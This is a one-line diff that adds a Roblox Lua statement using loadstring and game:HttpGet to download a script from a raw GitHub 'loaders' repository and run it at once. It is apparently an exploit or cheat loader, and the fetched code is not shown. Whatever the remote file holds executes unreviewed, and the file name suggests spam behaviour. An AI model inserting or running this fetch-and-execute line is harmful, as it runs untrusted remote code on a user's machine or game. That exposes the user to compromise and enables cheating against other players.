@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/upd-8-cvr-retro-spam7-ynmmd08lgt5ozg.lua"))()
